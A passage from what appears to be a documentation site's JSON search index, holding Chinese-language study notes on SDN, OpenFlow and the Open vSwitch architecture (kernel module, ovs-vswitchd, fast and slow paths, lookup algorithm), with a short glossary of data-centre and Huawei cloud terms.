\u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff0c\u5206\u79bb\u4e4b\u540e\u5e94\u8be5\u591a\u8fdc\uff1f\u591a\u5c11\u5b9e\u529b\u624d\u80fd\u6ee1\u8db3\u6545\u969c\u7684\u6062\u590d\u80fd\u529b\u4e0e\u9ad8\u53ef\u7528\u6027\u7684\u9700\u6c42\uff1f","title":"\u57fa\u7840\u77e5\u8bc6"},{"location":"Note/SDN/SDN/#_2","text":"","title":"\u63a7\u5236\u5e73\u9762\u4e0e\u6570\u636e\u5e73\u9762"},{"location":"Note/SDN/SDN/#_3","text":"\u63a7\u5236\u5e73\u9762\u5728\u672c\u5730\u5efa\u7acb\u7528\u4e8e\u521b\u5efa\u8f6c\u53d1\u8868\u9879\u7684\u6570\u636e\u96c6\uff0c\u6570\u636e\u5e73\u9762\u5229\u7528\u8f6c\u53d1\u8868\u9879\u5728\u8bbe\u5907\u7684\u51fa\u5165\u7aef\u53e3\u4e4b\u95f4\u8f6c\u53d1\u6d41\u91cf \u4fdd\u5b58\u4e86\u7f51\u7edc\u62ec\u6251\u7684\u6570\u636e\u96c6\u6210\u4e3a\u8def\u7531\u4fe1\u606f\u5e93RIB \u4fdd\u5b58\u4e86\u8f6c\u53d1\u8868\u9879\u5219\u79f0\u4e3a\u8f6c\u53d1\u4fe1\u606f\u5e93FIB","title":"\u63a7\u5236\u5e73\u9762"},{"location":"Note/SDN/SDN/#_4","text":"","title":"\u6570\u636e\u5e73\u9762"},{"location":"Note/SDN/\u6742\u9879/","text":"OpenFlow OpenFlow\u662f\u4e00\u4e2a\u534f\u8bae\uff0c\u53ef\u4ee5\u770b\u6210\u662fSDN\u7684\u4e00\u4e2a\u5b9e\u73b0 OpenFlow\u53ef\u4ee5\u5b9a\u4e49\u7f51\u7edc\u5305\u5728\u4ea4\u6362\u673a\u4e2d\u7684\u5904\u7406\u6d41\u7a0b\uff08pipeline\uff09\uff0c\u56e0\u6b64\u652f\u6301OpenFlow\u7684\u4ea4\u6362\u673a\uff0c\u5176\u529f\u80fd\u4e0d\u518d\u662f\u56fa\u5b9a\u7684\uff0c\u901a\u8fc7OpenFlow\u53ef\u4ee5\u8f6f\u4ef6\u5b9a\u4e49OpenVSwitch\u6240\u5177\u5907\u7684\u529f\u80fd\uff0c OVS \u865a\u62df\u4ea4\u6362\u673a Open vSwitch\uff08\u4e0b\u9762\u7b80\u79f0\u4e3a OVS\uff09\u662f\u7531 Nicira Networks \u4e3b\u5bfc\u7684\uff0c\u8fd0\u884c\u5728\u865a\u62df\u5316\u5e73\u53f0\uff08\u4f8b\u5982 KVM\uff0cXen\uff09\u4e0a\u7684\u865a\u62df\u4ea4\u6362\u673a \u5728\u865a\u62df\u5316\u5e73\u53f0\u4e0a\uff0cOVS \u53ef\u4ee5\u4e3a\u52a8\u6001\u53d8\u5316\u7684\u7aef\u70b9\u63d0\u4f9b 2 \u5c42\u4ea4\u6362\u529f\u80fd\uff0c\u5f88\u597d\u7684\u63a7\u5236\u865a\u62df\u7f51\u7edc\u4e2d\u7684\u8bbf\u95ee\u7b56\u7565\u3001\u7f51\u7edc\u9694\u79bb\u3001\u6d41\u91cf\u76d1\u63a7\u7b49\u7b49 vSwitch \u7684\u65e9\u671f\u4ee3\u8868\u662fLinuxBridge\uff0c\u5b83\u7684\u76ee\u7684\u5c31\u662f\u4e3a\u4e86\u63d0\u4f9b\u7f51\u7edc\u8fde\u63a5\uff0c\u6a21\u62df\u4e86ToR\u4ea4\u6362\u673a\u7684\u884c\u4e3a\u3002\u8fd9\u6837\u7684\u786e\u662f\u76f4\u63a5\u5957\u7528\u4e86\u73b0\u5b9e\u7269\u7406\u7f51\u7edc\u7684\u7406\u8bba\u548c\u534f\u8bae\uff0c\u4f46\u662f\u5e26\u6765\u4e86\u865a\u62df\u7f51\u7edc\u4e0e\u7269\u7406\u7f51\u7edc\u7684\u8026\u5408\u6027\u7684\u95ee\u9898 TOR\uff08Top of Rack\uff09\u6307\u7684\u662f\u5728\u6bcf\u4e2a\u670d\u52a1\u5668\u673a\u67dc\u4e0a\u90e8\u7f721\uff5e2\u53f0\u4ea4\u6362\u673a\uff0c\u670d\u52a1\u5668\u76f4\u63a5\u63a5\u5165\u5230\u672c\u673a\u67dc\u7684\u4ea4\u6362\u673a\u4e0a\uff0c\u5b9e\u73b0\u670d\u52a1\u5668\u4e0e\u4ea4\u6362\u673a\u5728\u673a\u67dc\u5185\u7684\u4e92\u8054\u3002\u867d\u7136\u4ece\u5b57\u9762\u4e0a\u770b\uff0cTop of Rack\u6307\u7684\u662f\u201c\u673a\u67dc\u9876\u90e8\u201d\uff0c\u4f46\u5b9e\u9645TOR\u7684\u6838\u5fc3\u5728\u4e8e\u5c06\u4ea4\u6362\u673a\u90e8\u7f72\u5728\u670d\u52a1\u5668\u673a\u67dc\u5185\uff0c\u65e2\u53ef\u4ee5\u90e8\u7f72\u5728\u673a\u67dc\u9876\u90e8\uff0c\u4e5f\u53ef\u4ee5\u90e8\u7f72\u5728\u673a\u67dc\u7684\u4e2d\u90e8\uff08Middle of Rack\uff09\u6216\u5e95\u90e8\uff08Bottom of Rack\uff09\uff0c\u5982\u56fe2-1\u6240\u793a\u3002\u901a\u5e38\u800c\u8a00\uff0c\u5c06\u4ea4\u6362\u673a\u90e8\u7f72\u5728\u673a\u67dc\u9876\u90e8\u662f\u6700\u6709\u5229\u4e8e\u8d70\u7ebf\u7684\uff0c\u56e0\u6b64\u8fd9\u79cd\u67b6\u6784\u5e94\u7528\u6700\u591a\u3002 OpenFlow OpenVSwitch\u6709\u4e00\u4e2a\u7279\u70b9\u662f\u57fa\u4e8eOpenFlow\u7684\uff0c\u7531\u4e8eOpenflow\u7684\u7075\u6d3b\u6027\u662f\u5efa\u7acb\u5728\u53ef\u4ee5\u5b9a\u4e49\u7f51\u7edc\u5305\u5728\u4ea4\u6362\u673a\u7684\u5904\u7406\u6d41\u7a0b\uff0c\u4f46\u662f\u5bf9\u4e8e\u590d\u6742\u529f\u80fd\u6765\u8bf4\uff0c\u6d41\u7a0b\u8d8a\u957f\uff0c\u5904\u7406\u4e00\u4e2a\u7f51\u7edc\u5305\u7684\u9700\u8981\u65f6\u95f4\u4e5f\u8d8a\u957f\uff0cOVS\u5bf9\u6b64\u505a\u4e86\u5f88\u591a\u4f18\u5316\u3002 \u5bf9\u4e8e\u4e00\u4e2aLinux\u7cfb\u7edf\u6765\u8bf4\uff0c\u53ef\u4ee5\u5206\u4e3a\u7528\u6237\u7a7a\u95f4\uff08user space\uff09\u548c\u5185\u6838\u7a7a\u95f4\uff08kernel space\uff09\uff0c\u7f51\u7edc\u8bbe\u5907\u63a5\u5165\u5230\u5185\u6838\u7a7a\u95f4\u3002\u5982\u679c\u9700\u8981\u5c06\u6570\u636e\u4f20\u8f93\u5230\u7528\u6237\u7a0b\u5e8f\u5219\u9700\u8981\u901a\u8fc7\u5185\u6838\u7a7a\u95f4\u5c06\u6570\u636e\u4e0a\u9001\u5230\u7528\u6237\u7a7a\u95f4\uff0c\u5982\u679c\u9700\u8981\u5728\u7f51\u7edc\u8bbe\u5907\u4e4b\u95f4\u8f6c\u53d1\u6570\u636e\uff0c\u76f4\u63a5\u5728\u5185\u6838\u7a7a\u95f4\u5c31\u53ef\u4ee5\u5b8c\u6210\u3002 \u4f5c\u4e3a\u8fd0\u884c\u5728x86\u670d\u52a1\u5668\u4e2d\u7684\u8f6f\u4ef6\u4ea4\u6362\u673a\uff0c\u76f4\u89c2\u4e0a\u6765\u770b\uff0c\u5e94\u8be5\u5728\u5185\u6838\u7a7a\u95f4\u6765\u5b9e\u73b0\u8f6c\u53d1\u3002\u56e0\u6b64\uff0c OpenVSwitch\u5728\u6700\u65e9\u671f\u7684\u65f6\u5019\uff0c\u5728Linux\u5185\u6838\u6a21\u5757\u5b9e\u73b0\u4e86\u6240\u6709\u7684OpenFlow\u7684\u5904\u7406 \u3002\u5f53\u65f6\u7684OpenVSwitch\u5185\u6838\u6a21\u5757\uff0c\u63a5\u6536\u7f51\u7edc\u6570\u636e\u5305\uff0c\u6839\u636eOpenFlow\u89c4\u5219\uff0c\u4e00\u6b65\u6b65\u7684Match\uff0c\u5e76\u6839\u636eAction\u4fee\u6539\u7f51\u7edc\u6570\u636e\u5305\uff0c\u6700\u540e\u4ece\u67d0\u4e2a\u7f51\u7edc\u8bbe\u5907\u9001\u51fa\u3002 \u4f46\u662f\u8fd9\u79cd\u65b9\u5f0f\u5f88\u5feb\u8bc1\u660e\u662f\u4e0d\u80fd\u5b9e\u9645\u5e94\u7528\u7684 \u5185\u6838\u8fdb\u884c\u7a0b\u5e8f\u5f00\u53d1\u4e0e\u66f4\u65b0\u66f4\u56f0\u96be\uff0cOVS\u9700\u8981\u5927\u91cf\u66f4\u65b0 \u5b8c\u5168\u6309\u7167openflow\u534f\u8bae\u53bb\u5904\u7406\u7f51\u7edc\u5305\uff0c\u9700\u8981\u6d88\u8017\u5927\u91cf\u7684CPU\u8d44\u6e90\uff0c\u964d\u4f4e\u7f51\u7edc\u6027\u80fd OVS(2.X)\u67b6\u6784 \u8be5\u7248\u672c\u7684\u7684OVS\u4e3b\u8981\u7531\u4e09\u4e2a\u90e8\u5206\u7ec4\u6210 ovsdb-server openflow\u88ab\u8bbe\u8ba1\u6210\u4e00\u4e2a\u534f\u8bae\uff0c\u672c\u8eab\u4e0d\u8003\u8651\u4ea4\u6362\u673a\u7684\u914d\u7f6e\uff0c\u5982Qos\uff0c\u5173\u8054SDN\u63a7\u5236\u5668\u7b49\u3002 ovsdb-server\u662fOVS\u5bf9 openflow\u7684\u5b9e\u73b0\u7684\u8865\u5145 \uff0c\u4f5c\u4e3aOVS\u7684 configuration database \uff0c\u4fdd\u5b58OVS\u7684\u6301\u4e45\u5316\u6570\u636e ovs-vswitchd \u8fd0\u884c\u5728\u7528\u6237\u7a7a\u95f4\u7684\u8f6c\u53d1\u7a0b\u5e8f\uff0c\u63a5\u53d7SDN\u63a7\u5236\u4e0b\u7684Openflow\u89c4\u5219\uff0c\u901a\u77e5ovs\u5185\u6838\u6a21\u5757\u5982\u4f55\u5904\u7406\u7f51\u7edc\u5305 ovs\u5185\u6838\u6a21\u5757 \u8fd0\u884c\u5728\u5185\u6838\u7a7a\u95f4\u7684\u8f6c\u53d1\u7a0b\u5e8f\uff0c\u6839\u636eovs-vswitchd\u7684\u6307\u793a\uff0c\u5904\u7406\u7f51\u7edc\u6570\u636e\u5305 OVS\u6709\u5feb\u901f\u8def\u5f84\uff08fast path\uff09\u548c\u6162\u901f\u8def\u5f84\uff08slow path\uff09\uff0c\u5206\u522b\u5bf9\u5e94\u4e86ovs\u5185\u6838\u6a21\u5757\u548covs-vswitchd\u3002openflow\u5b58\u50a8\u5728slow path\u4e2d\uff0c\u4e3a\u4e86\u5feb\u901f\u8f6c\u53d1\uff0c\u7f51\u7edc\u5305\u9700\u8981\u5c3d\u53ef\u80fd\u548b\u7684fast path\u4e2d\u8f6c\u53d1\uff0c\u56e0\u6b64\uff1a \u5f53\u4e00\u4e2a\u7f51\u7edc\u8fde\u63a5\u7684\u7b2c\u4e00\u4e2a\u7f51\u7edc\u6570\u636e\u5305\uff08\u9996\u5305\uff09\u88ab\u53d1\u51fa\u65f6\uff0cOVS\u5185\u6838\u6a21\u5757\u4f1a\u5148\u6536\u5230\u8fd9\u4e2apacket\u3002\u4f46\u662f\u5185\u6838\u6a21\u5757\u73b0\u5728\u8fd8\u4e0d\u77e5\u9053\u5982\u4f55\u5904\u7406\u8fd9\u4e2a\u5305\uff0c\u56e0\u4e3a \u6240\u6709\u7684OpenFlow\u90fd\u5b58\u5728ovs-vswitchd \uff0c\u56e0\u6b64\u5b83\u7684\u9ed8\u8ba4\u884c\u4e3a\u662f\u5c06\u8fd9\u4e2a\u5305\u4e0a\u9001\u5230ovs-vswitchd\u3002 ovs-vswitchd\u901a\u8fc7OpenFlow pipeline\uff0c\u5904\u7406\u5b8c\u7f51\u7edc\u6570\u636e\u5305\u9001\u56de\u7ed9OVS\u5185\u6838\u6a21\u5757\uff0c\u540c\u65f6\uff0covs-vswitchd\u8fd8\u4f1a\u751f\u6210\u4e00\u4e32\u7c7b\u4f3c\u4e8eOpenFlow Action\uff0c\u4f46\u662f\u66f4\u7b80\u5355\u7684 datapath action \u3002\u8fd9\u4e32datapath action\u4f1a\u4e00\u8d77\u9001\u5230OVS\u5185\u6838\u6a21\u5757\u3002 \u56e0\u4e3a\u540c\u4e00\u4e2a\u7f51\u7edc\u8fde\u63a5\u7684\u6240\u6709\u7f51\u7edc\u6570\u636e\u5305\u7279\u5f81\uff08IP\uff0cMAC\uff0c\u7aef\u53e3\u53f7\uff09\u90fd\u4e00\u6837\uff0c\u5f53OVS\u5185\u6838\u6a21\u5757\u6536\u5230\u5176\u4ed6\u7f51\u7edc\u5305\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u76f4\u63a5\u5e94\u7528datapath action\u3002\u56e0\u6b64\uff0c\u8fd9\u91cc\u5c06OVS\u5185\u6838\u6a21\u5757\u4e0eOpenFlow\u534f\u8bae\u89e3\u8026\u4e86\uff0cOpenFlow\u7684\u5c0f\u6539\u52a8\u5f71\u54cd\u4e0d\u5230\u5185\u6838\u6a21\u5757\u3002 \u67e5\u627e\u7b97\u6cd5 OpenVSwitch\uff0c\u4e0d\u8bba\u662f\u7528\u6237\u7a7a\u95f4\u7684ovs-vswitchd\uff0c\u8fd8\u662f\u5185\u6838\u7a7a\u95f4\u7684kernel datapath\uff0c\u6700\u6838\u5fc3\u90fd\u662f\u8981\u5b9e\u73b0\u4e00\u4e2a\u67e5\u627e\u7b97\u6cd5\u3002 \u5bf9\u4e8eovs-vswitchd\uff0c\u9700\u8981\u6839\u636e\u7f51\u7edc\u6570\u636e\u5305\u7684\u7279\u5f81\uff082-4\u5c42\u5305\u5934\uff0cmetadata\uff09\u4ece\u4e00\u4e2a\u4e2a\u7684OpenFlow Table\u4e2d\u67e5\u627eOpenFlow\u89c4\u5219\u3002 \u5bf9\u4e8ekernel datapath\uff0c\u4e5f\u9700\u8981\u6839\u636e\u7f51\u7edc\u6570\u636e\u5305\u7684\u7279\u5f81\uff0c\u4ececache\u4e2d\u67e5\u627edatapath actions\u3002 OpenVSwitch\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7edf\u4e00\u7684\u67e5\u627e\u7b97\u6cd5\uff1aTSS\uff08Tuple Space Search\uff09\uff0c\u8fd9\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a hash \u67e5\u627e\u7b97\u6cd5 \u3002 DPDK Ovs \u6709\u4f7f\u7528 DPDK \u4f5c\u4e3a\u57fa\u7840\u6765\u5b9e\u73b0\u5305\u7684\u8f6c\u53d1 \u53c2\u8003\u8d44\u6599 https://cloud.tencent.com/developer/article/1198333 \u540d\u8bcd \u7f51\u7edc\u540d\u8bcd Q-router \u5206\u5e03\u5f0f\u8def\u7531DVR \uff0cqr\u662f Q-router\u7684\u7f51\u5173\u53e3\uff0c\u6bcf\u4e2a\u5b50\u7f51\u4e00\u4e2a\uff1f Qos router\uff1fQuality of Service Router\uff1f \u5bf9\u6d41\u91cf\u8fdb\u884c\u670d\u52a1\u4f18\u5148\u7ea7\u914d\u7f6e\uff0c\u8fbe\u5230\u9650\u901f\u548c\u4fdd\u8bc1\u9ad8\u4f18\u5148\u7ea7\u522b\u6d41\u91cf\u901a\u8fc7\u62e5\u585e\u8def\u5f84\u4e0a\u7684\u8def\u7531\u8bbe\u5907 V-Router \u7f51\u5173\u53e3\u662f sg qvm port\uff1f TOP TOR top of rack \u4ea4\u6362\u673a\u653e\u5728\u673a\u67b6\u7684\u6700\u4e0a\u9762 SPI \u534e\u4e3a\u540d\u8bcd FusionCloud \u684c\u9762\u4e91\u89e3\u51b3\u65b9\u6848 FC Fusion Compute FM Fusion Manager FA Fusion Access \u684c\u9762\u7ba1\u7406\u8f6f\u4ef6 F\uff1f Fusion Cube \u878d\u5408\u89e3\u51b3\u65b9\u6848 VNC \u5728\u865a\u62df\u673a\u7f51\u7edc\u4e0d\u901a\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u901a\u8fc7VNC\u767b\u5f55\uff0c\u5148\u767b\u5f55\u5230\u865a\u62df\u673a\u6240\u5728\u7684\u5bbf\u4e3b\u673a\uff0c\u518d\u901a\u8fc7\u5185\u90e8\u901a\u9053\u8bbf\u95ee\u81f3\u4e3b\u673a \u6211\u5f88\u597d\u5947\u8fd9\u4e48\u591a\u53e3\u662f\u7528\u6765\u5e72\u561b\u7684\u3002\u3002\u3002","title":"\u6742\u9879"},{"location":"Note/SDN/\u6742\u9879/#openflow","text":"OpenFlow\u662f\u4e00\u4e2a\u534f\u8bae\uff0c\u53ef\u4ee5\u770b\u6210\u662fSDN\u7684\u4e00\u4e2a\u5b9e\u73b0 OpenFlow\u53ef\u4ee5\u5b9a\u4e49\u7f51\u7edc\u5305\u5728\u4ea4\u6362\u673a\u4e2d\u7684\u5904\u7406\u6d41\u7a0b\uff08pipeline\uff09\uff0c\u56e0\u6b64\u652f\u6301OpenFlow\u7684\u4ea4\u6362\u673a\uff0c\u5176\u529f\u80fd\u4e0d\u518d\u662f\u56fa\u5b9a\u7684\uff0c\u901a\u8fc7OpenFlow\u53ef\u4ee5\u8f6f\u4ef6\u5b9a\u4e49OpenVSwitch\u6240\u5177\u5907\u7684\u529f\u80fd\uff0c","title":"OpenFlow"},{"location":"Note/SDN/\u6742\u9879/#ovs","text":"\u865a\u62df\u4ea4\u6362\u673a Open vSwitch\uff08\u4e0b\u9762\u7b80\u79f0\u4e3a OVS\uff09\u662f\u7531 Nicira Networks \u4e3b\u5bfc\u7684\uff0c\u8fd0\u884c\u5728\u865a\u62df\u5316\u5e73\u53f0\uff08\u4f8b\u5982 KVM\uff0cXen\uff09\u4e0a\u7684\u865a\u62df\u4ea4\u6362\u673a \u5728\u865a\u62df\u5316\u5e73\u53f0\u4e0a\uff0cOVS \u53ef\u4ee5\u4e3a\u52a8\u6001\u53d8\u5316\u7684\u7aef\u70b9\u63d0\u4f9b 2 \u5c42\u4ea4\u6362\u529f\u80fd\uff0c\u5f88\u597d\u7684\u63a7\u5236\u865a\u62df\u7f51\u7edc\u4e2d\u7684\u8bbf\u95ee\u7b56\u7565\u3001\u7f51\u7edc\u9694\u79bb\u3001\u6d41\u91cf\u76d1\u63a7\u7b49\u7b49 vSwitch \u7684\u65e9\u671f\u4ee3\u8868\u662fLinuxBridge\uff0c\u5b83\u7684\u76ee\u7684\u5c31\u662f\u4e3a\u4e86\u63d0\u4f9b\u7f51\u7edc\u8fde\u63a5\uff0c\u6a21\u62df\u4e86ToR\u4ea4\u6362\u673a\u7684\u884c\u4e3a\u3002\u8fd9\u6837\u7684\u786e\u662f\u76f4\u63a5\u5957\u7528\u4e86\u73b0\u5b9e\u7269\u7406\u7f51\u7edc\u7684\u7406\u8bba\u548c\u534f\u8bae\uff0c\u4f46\u662f\u5e26\u6765\u4e86\u865a\u62df\u7f51\u7edc\u4e0e\u7269\u7406\u7f51\u7edc\u7684\u8026\u5408\u6027\u7684\u95ee\u9898 TOR\uff08Top of Rack\uff09\u6307\u7684\u662f\u5728\u6bcf\u4e2a\u670d\u52a1\u5668\u673a\u67dc\u4e0a\u90e8\u7f721\uff5e2\u53f0\u4ea4\u6362\u673a\uff0c\u670d\u52a1\u5668\u76f4\u63a5\u63a5\u5165\u5230\u672c\u673a\u67dc\u7684\u4ea4\u6362\u673a\u4e0a\uff0c\u5b9e\u73b0\u670d\u52a1\u5668\u4e0e\u4ea4\u6362\u673a\u5728\u673a\u67dc\u5185\u7684\u4e92\u8054\u3002\u867d\u7136\u4ece\u5b57\u9762\u4e0a\u770b\uff0cTop of Rack\u6307\u7684\u662f\u201c\u673a\u67dc\u9876\u90e8\u201d\uff0c\u4f46\u5b9e\u9645TOR\u7684\u6838\u5fc3\u5728\u4e8e\u5c06\u4ea4\u6362\u673a\u90e8\u7f72\u5728\u670d\u52a1\u5668\u673a\u67dc\u5185\uff0c\u65e2\u53ef\u4ee5\u90e8\u7f72\u5728\u673a\u67dc\u9876\u90e8\uff0c\u4e5f\u53ef\u4ee5\u90e8\u7f72\u5728\u673a\u67dc\u7684\u4e2d\u90e8\uff08Middle of Rack\uff09\u6216\u5e95\u90e8\uff08Bottom of Rack\uff09\uff0c\u5982\u56fe2-1\u6240\u793a\u3002\u901a\u5e38\u800c\u8a00\uff0c\u5c06\u4ea4\u6362\u673a\u90e8\u7f72\u5728\u673a\u67dc\u9876\u90e8\u662f\u6700\u6709\u5229\u4e8e\u8d70\u7ebf\u7684\uff0c\u56e0\u6b64\u8fd9\u79cd\u67b6\u6784\u5e94\u7528\u6700\u591a\u3002","title":"OVS"},{"location":"Note/SDN/\u6742\u9879/#openflow_1","text":"OpenVSwitch\u6709\u4e00\u4e2a\u7279\u70b9\u662f\u57fa\u4e8eOpenFlow\u7684\uff0c\u7531\u4e8eOpenflow\u7684\u7075\u6d3b\u6027\u662f\u5efa\u7acb\u5728\u53ef\u4ee5\u5b9a\u4e49\u7f51\u7edc\u5305\u5728\u4ea4\u6362\u673a\u7684\u5904\u7406\u6d41\u7a0b\uff0c\u4f46\u662f\u5bf9\u4e8e\u590d\u6742\u529f\u80fd\u6765\u8bf4\uff0c\u6d41\u7a0b\u8d8a\u957f\uff0c\u5904\u7406\u4e00\u4e2a\u7f51\u7edc\u5305\u7684\u9700\u8981\u65f6\u95f4\u4e5f\u8d8a\u957f\uff0cOVS\u5bf9\u6b64\u505a\u4e86\u5f88\u591a\u4f18\u5316\u3002 \u5bf9\u4e8e\u4e00\u4e2aLinux\u7cfb\u7edf\u6765\u8bf4\uff0c\u53ef\u4ee5\u5206\u4e3a\u7528\u6237\u7a7a\u95f4\uff08user space\uff09\u548c\u5185\u6838\u7a7a\u95f4\uff08kernel space\uff09\uff0c\u7f51\u7edc\u8bbe\u5907\u63a5\u5165\u5230\u5185\u6838\u7a7a\u95f4\u3002\u5982\u679c\u9700\u8981\u5c06\u6570\u636e\u4f20\u8f93\u5230\u7528\u6237\u7a0b\u5e8f\u5219\u9700\u8981\u901a\u8fc7\u5185\u6838\u7a7a\u95f4\u5c06\u6570\u636e\u4e0a\u9001\u5230\u7528\u6237\u7a7a\u95f4\uff0c\u5982\u679c\u9700\u8981\u5728\u7f51\u7edc\u8bbe\u5907\u4e4b\u95f4\u8f6c\u53d1\u6570\u636e\uff0c\u76f4\u63a5\u5728\u5185\u6838\u7a7a\u95f4\u5c31\u53ef\u4ee5\u5b8c\u6210\u3002 \u4f5c\u4e3a\u8fd0\u884c\u5728x86\u670d\u52a1\u5668\u4e2d\u7684\u8f6f\u4ef6\u4ea4\u6362\u673a\uff0c\u76f4\u89c2\u4e0a\u6765\u770b\uff0c\u5e94\u8be5\u5728\u5185\u6838\u7a7a\u95f4\u6765\u5b9e\u73b0\u8f6c\u53d1\u3002\u56e0\u6b64\uff0c OpenVSwitch\u5728\u6700\u65e9\u671f\u7684\u65f6\u5019\uff0c\u5728Linux\u5185\u6838\u6a21\u5757\u5b9e\u73b0\u4e86\u6240\u6709\u7684OpenFlow\u7684\u5904\u7406 \u3002\u5f53\u65f6\u7684OpenVSwitch\u5185\u6838\u6a21\u5757\uff0c\u63a5\u6536\u7f51\u7edc\u6570\u636e\u5305\uff0c\u6839\u636eOpenFlow\u89c4\u5219\uff0c\u4e00\u6b65\u6b65\u7684Match\uff0c\u5e76\u6839\u636eAction\u4fee\u6539\u7f51\u7edc\u6570\u636e\u5305\uff0c\u6700\u540e\u4ece\u67d0\u4e2a\u7f51\u7edc\u8bbe\u5907\u9001\u51fa\u3002 \u4f46\u662f\u8fd9\u79cd\u65b9\u5f0f\u5f88\u5feb\u8bc1\u660e\u662f\u4e0d\u80fd\u5b9e\u9645\u5e94\u7528\u7684 \u5185\u6838\u8fdb\u884c\u7a0b\u5e8f\u5f00\u53d1\u4e0e\u66f4\u65b0\u66f4\u56f0\u96be\uff0cOVS\u9700\u8981\u5927\u91cf\u66f4\u65b0 \u5b8c\u5168\u6309\u7167openflow\u534f\u8bae\u53bb\u5904\u7406\u7f51\u7edc\u5305\uff0c\u9700\u8981\u6d88\u8017\u5927\u91cf\u7684CPU\u8d44\u6e90\uff0c\u964d\u4f4e\u7f51\u7edc\u6027\u80fd","title":"OpenFlow"},{"location":"Note/SDN/\u6742\u9879/#ovs2x","text":"\u8be5\u7248\u672c\u7684\u7684OVS\u4e3b\u8981\u7531\u4e09\u4e2a\u90e8\u5206\u7ec4\u6210 ovsdb-server openflow\u88ab\u8bbe\u8ba1\u6210\u4e00\u4e2a\u534f\u8bae\uff0c\u672c\u8eab\u4e0d\u8003\u8651\u4ea4\u6362\u673a\u7684\u914d\u7f6e\uff0c\u5982Qos\uff0c\u5173\u8054SDN\u63a7\u5236\u5668\u7b49\u3002 ovsdb-server\u662fOVS\u5bf9 openflow\u7684\u5b9e\u73b0\u7684\u8865\u5145 \uff0c\u4f5c\u4e3aOVS\u7684 configuration database \uff0c\u4fdd\u5b58OVS\u7684\u6301\u4e45\u5316\u6570\u636e ovs-vswitchd \u8fd0\u884c\u5728\u7528\u6237\u7a7a\u95f4\u7684\u8f6c\u53d1\u7a0b\u5e8f\uff0c\u63a5\u53d7SDN\u63a7\u5236\u4e0b\u7684Openflow\u89c4\u5219\uff0c\u901a\u77e5ovs\u5185\u6838\u6a21\u5757\u5982\u4f55\u5904\u7406\u7f51\u7edc\u5305 ovs\u5185\u6838\u6a21\u5757 \u8fd0\u884c\u5728\u5185\u6838\u7a7a\u95f4\u7684\u8f6c\u53d1\u7a0b\u5e8f\uff0c\u6839\u636eovs-vswitchd\u7684\u6307\u793a\uff0c\u5904\u7406\u7f51\u7edc\u6570\u636e\u5305 OVS\u6709\u5feb\u901f\u8def\u5f84\uff08fast path\uff09\u548c\u6162\u901f\u8def\u5f84\uff08slow path\uff09\uff0c\u5206\u522b\u5bf9\u5e94\u4e86ovs\u5185\u6838\u6a21\u5757\u548covs-vswitchd\u3002openflow\u5b58\u50a8\u5728slow path\u4e2d\uff0c\u4e3a\u4e86\u5feb\u901f\u8f6c\u53d1\uff0c\u7f51\u7edc\u5305\u9700\u8981\u5c3d\u53ef\u80fd\u548b\u7684fast path\u4e2d\u8f6c\u53d1\uff0c\u56e0\u6b64\uff1a \u5f53\u4e00\u4e2a\u7f51\u7edc\u8fde\u63a5\u7684\u7b2c\u4e00\u4e2a\u7f51\u7edc\u6570\u636e\u5305\uff08\u9996\u5305\uff09\u88ab\u53d1\u51fa\u65f6\uff0cOVS\u5185\u6838\u6a21\u5757\u4f1a\u5148\u6536\u5230\u8fd9\u4e2apacket\u3002\u4f46\u662f\u5185\u6838\u6a21\u5757\u73b0\u5728\u8fd8\u4e0d\u77e5\u9053\u5982\u4f55\u5904\u7406\u8fd9\u4e2a\u5305\uff0c\u56e0\u4e3a \u6240\u6709\u7684OpenFlow\u90fd\u5b58\u5728ovs-vswitchd \uff0c\u56e0\u6b64\u5b83\u7684\u9ed8\u8ba4\u884c\u4e3a\u662f\u5c06\u8fd9\u4e2a\u5305\u4e0a\u9001\u5230ovs-vswitchd\u3002 ovs-vswitchd\u901a\u8fc7OpenFlow pipeline\uff0c\u5904\u7406\u5b8c\u7f51\u7edc\u6570\u636e\u5305\u9001\u56de\u7ed9OVS\u5185\u6838\u6a21\u5757\uff0c\u540c\u65f6\uff0covs-vswitchd\u8fd8\u4f1a\u751f\u6210\u4e00\u4e32\u7c7b\u4f3c\u4e8eOpenFlow Action\uff0c\u4f46\u662f\u66f4\u7b80\u5355\u7684 datapath action \u3002\u8fd9\u4e32datapath action\u4f1a\u4e00\u8d77\u9001\u5230OVS\u5185\u6838\u6a21\u5757\u3002 \u56e0\u4e3a\u540c\u4e00\u4e2a\u7f51\u7edc\u8fde\u63a5\u7684\u6240\u6709\u7f51\u7edc\u6570\u636e\u5305\u7279\u5f81\uff08IP\uff0cMAC\uff0c\u7aef\u53e3\u53f7\uff09\u90fd\u4e00\u6837\uff0c\u5f53OVS\u5185\u6838\u6a21\u5757\u6536\u5230\u5176\u4ed6\u7f51\u7edc\u5305\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u76f4\u63a5\u5e94\u7528datapath action\u3002\u56e0\u6b64\uff0c\u8fd9\u91cc\u5c06OVS\u5185\u6838\u6a21\u5757\u4e0eOpenFlow\u534f\u8bae\u89e3\u8026\u4e86\uff0cOpenFlow\u7684\u5c0f\u6539\u52a8\u5f71\u54cd\u4e0d\u5230\u5185\u6838\u6a21\u5757\u3002","title":"OVS(2.X)\u67b6\u6784"},{"location":"Note/SDN/\u6742\u9879/#_1","text":"OpenVSwitch\uff0c\u4e0d\u8bba\u662f\u7528\u6237\u7a7a\u95f4\u7684ovs-vswitchd\uff0c\u8fd8\u662f\u5185\u6838\u7a7a\u95f4\u7684kernel datapath\uff0c\u6700\u6838\u5fc3\u90fd\u662f\u8981\u5b9e\u73b0\u4e00\u4e2a\u67e5\u627e\u7b97\u6cd5\u3002 \u5bf9\u4e8eovs-vswitchd\uff0c\u9700\u8981\u6839\u636e\u7f51\u7edc\u6570\u636e\u5305\u7684\u7279\u5f81\uff082-4\u5c42\u5305\u5934\uff0cmetadata\uff09\u4ece\u4e00\u4e2a\u4e2a\u7684OpenFlow Table\u4e2d\u67e5\u627eOpenFlow\u89c4\u5219\u3002 \u5bf9\u4e8ekernel datapath\uff0c\u4e5f\u9700\u8981\u6839\u636e\u7f51\u7edc\u6570\u636e\u5305\u7684\u7279\u5f81\uff0c\u4ececache\u4e2d\u67e5\u627edatapath actions\u3002 